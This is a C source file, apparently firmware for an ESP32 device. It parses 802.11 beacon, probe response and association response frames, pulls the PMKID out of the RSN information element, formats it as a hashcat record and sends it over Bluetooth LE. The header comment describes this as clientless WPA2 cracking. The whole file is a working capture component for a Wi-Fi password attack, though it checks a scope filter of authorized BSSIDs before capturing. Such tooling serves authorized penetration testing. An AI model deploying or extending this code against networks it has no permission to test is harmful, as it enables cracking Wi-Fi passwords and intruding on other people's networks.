/**
 * PMKID Extractor Implementation
 *
 * Extracts PMKID from RSN Information Elements in 802.11 management frames.
 * PMKID attack allows clientless WPA2 cracking.
 */

#include "pmkid_extractor.h"
#include "config.h"
#include "scope_filter.h"
#include "ssid_cache.h"
#include "hashcat_formatter.h"
#include "ble_service.h"

#include <string.h>
#include "esp_log.h"

// 802.11 Frame Control field masks
#define FC_TYPE_MASK      0x0C
#define FC_SUBTYPE_MASK   0xF0
#define FC_TYPE_MGMT      0x00
#define FC_SUBTYPE_ASSOC_RESP  0x10
#define FC_SUBTYPE_PROBE_RESP  0x50
#define FC_SUBTYPE_BEACON      0x80

// Management frame header size
#define MGMT_HEADER_SIZE 24

// Information Element IDs
#define IE_SSID 0
#define IE_RSN  48

// RSN IE offsets
#define RSN_VERSION_OFFSET 0
#define RSN_VERSION_SIZE   2

void pmkid_extractor_init(void) {
    ESP_LOGI(TAG, "PMKID extractor initialized");
}

/**
 * Find an Information Element by ID in the frame.
 */
static const uint8_t* find_ie(const uint8_t *ie_start, size_t ie_len, uint8_t ie_id) {
    const uint8_t *ptr = ie_start;
    const uint8_t *end = ie_start + ie_len;

    while (ptr + 2 <= end) {
        uint8_t id = ptr[0];
        uint8_t len = ptr[1];

        if (ptr + 2 + len > end) {
            break;
        }

        if (id == ie_id) {
            return ptr;
        }

        ptr += 2 + len;
    }

    return NULL;
}

/**
 * Parse RSN IE to extract PMKID.
 * Returns true if PMKID found, false otherwise.
 */
static bool parse_rsn_pmkid(const uint8_t *rsn_ie, uint8_t *pmkid_out) {
    uint8_t ie_len = rsn_ie[1];
    if (ie_len < 20) {
        return false;
    }

    const uint8_t *ptr = rsn_ie + 2;  // Skip tag and length
    const uint8_t *end = rsn_ie + 2 + ie_len;

    // Skip Version (2 bytes)
    ptr += 2;
    if (ptr >= end) return false;

    // Skip Group Cipher Suite (4 bytes)
    ptr += 4;
    if (ptr >= end) return false;

    // Pairwise Cipher Suite Count (2 bytes)
    if (ptr + 2 > end) return false;
    uint16_t pairwise_count = ptr[0] | (ptr[1] << 8);
    ptr += 2;

    // Skip Pairwise Cipher Suites (4 bytes each)
    ptr += pairwise_count * 4;
    if (ptr >= end) return false;

    // AKM Suite Count (2 bytes)
    if (ptr + 2 > end) return false;
    uint16_t akm_count = ptr[0] | (ptr[1] << 8);
    ptr += 2;

    // Skip AKM Suites (4 bytes each)
    ptr += akm_count * 4;
    if (ptr >= end) return false;

    // RSN Capabilities (2 bytes)
    if (ptr + 2 > end) return false;
    ptr += 2;

    // PMKID Count (2 bytes)
    if (ptr + 2 > end) return false;
    uint16_t pmkid_count = ptr[0] | (ptr[1] << 8);
    ptr += 2;

    if (pmkid_count == 0) {
        return false;
    }

    // PMKID (16 bytes)
    if (ptr + 16 > end) return false;

    memcpy(pmkid_out, ptr, 16);
    return true;
}

/**
 * Extract SSID from beacon/probe response fixed fields + IEs
 */
static bool extract_ssid(const uint8_t *ie_start, size_t ie_len, char *ssid_out, uint8_t *ssid_len_out) {
    const uint8_t *ssid_ie = find_ie(ie_start, ie_len, IE_SSID);
    if (!ssid_ie) {
        return false;
    }

    uint8_t len = ssid_ie[1];
    if (len == 0 || len > 32) {
        return false;
    }

    memcpy(ssid_out, ssid_ie + 2, len);
    ssid_out[len] = '\0';
    *ssid_len_out = len;
    return true;
}

/**
 * Extract BSSID and addresses from management frame header.
 */
static void extract_addresses(const uint8_t *frame, uint8_t *bssid, uint8_t *sa, uint8_t *da) {
    // Management frame header:
    // Offset 4:  Address 1 (DA)
    // Offset 10: Address 2 (SA)
    // Offset 16: Address 3 (BSSID)
    if (da) memcpy(da, frame + 4, 6);
    if (sa) memcpy(sa, frame + 10, 6);
    if (bssid) memcpy(bssid, frame + 16, 6);
}

void pmkid_process_beacon(const uint8_t *frame, size_t len) {
    if (len < MGMT_HEADER_SIZE + 12) {  // Header + fixed fields (timestamp 8 + interval 2 + cap 2)
        return;
    }

    uint8_t bssid[6];
    extract_addresses(frame, bssid, NULL, NULL);

    // Skip if not authorized (but still cache SSID for later use)
    const uint8_t *ie_start = frame + MGMT_HEADER_SIZE + 12;
    size_t ie_len = len - MGMT_HEADER_SIZE - 12;

    char ssid[33];
    uint8_t ssid_len;
    if (extract_ssid(ie_start, ie_len, ssid, &ssid_len)) {
        // Always cache SSID regardless of authorization
        ssid_cache_put(bssid, ssid, ssid_len);
    }

    // Check PMKID only for authorized BSSIDs
    if (!scope_filter_is_authorized(bssid)) {
        return;
    }

    const uint8_t *rsn_ie = find_ie(ie_start, ie_len, IE_RSN);
    if (!rsn_ie) {
        return;
    }

    uint8_t pmkid[16];
    if (!parse_rsn_pmkid(rsn_ie, pmkid)) {
        return;
    }

    // PMKID found! Format and transmit
    ESP_LOGI(TAG, "PMKID found in beacon from %02X:%02X:%02X:%02X:%02X:%02X",
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

    // Use broadcast as client MAC for beacon-extracted PMKID
    uint8_t client_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    char hashcat_record[256];
    size_t record_len = hashcat_format_pmkid(
        bssid, client_mac, pmkid,
        ssid, ssid_len,
        hashcat_record, sizeof(hashcat_record)
    );

    if (record_len > 0) {
        ble_service_send_capture(
            CAPTURE_KIND_PMKID,
            bssid,
            ssid, ssid_len,
            (const uint8_t *)hashcat_record, record_len
        );
    }
}

void pmkid_process_assoc_response(const uint8_t *frame, size_t len) {
    if (len < MGMT_HEADER_SIZE + 6) {  // Header + fixed fields (cap 2 + status 2 + aid 2)
        return;
    }

    uint8_t bssid[6];
    uint8_t client_mac[6];
    extract_addresses(frame, bssid, NULL, client_mac);

    // Check authorization
    if (!scope_filter_is_authorized(bssid)) {
        return;
    }

    const uint8_t *ie_start = frame + MGMT_HEADER_SIZE + 6;
    size_t ie_len = len - MGMT_HEADER_SIZE - 6;

    const uint8_t *rsn_ie = find_ie(ie_start, ie_len, IE_RSN);
    if (!rsn_ie) {
        return;
    }

    uint8_t pmkid[16];
    if (!parse_rsn_pmkid(rsn_ie, pmkid)) {
        return;
    }

    // Get SSID from cache
    char ssid[33];
    uint8_t ssid_len;
    if (!ssid_cache_get(bssid, ssid, &ssid_len)) {
        // No SSID cached, skip
        ESP_LOGW(TAG, "PMKID found but no SSID cached for BSSID");
        return;
    }

    ESP_LOGI(TAG, "PMKID found in assoc response from %02X:%02X:%02X:%02X:%02X:%02X (SSID: %s)",
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ssid);

    char hashcat_record[256];
    size_t record_len = hashcat_format_pmkid(
        bssid, client_mac, pmkid,
        ssid, ssid_len,
        hashcat_record, sizeof(hashcat_record)
    );

    if (record_len > 0) {
        ble_service_send_capture(
            CAPTURE_KIND_PMKID,
            bssid,
            ssid, ssid_len,
            (const uint8_t *)hashcat_record, record_len
        );
    }
}

void pmkid_process_probe_response(const uint8_t *frame, size_t len) {
    // Probe response has same structure as beacon
    pmkid_process_beacon(frame, len);
}
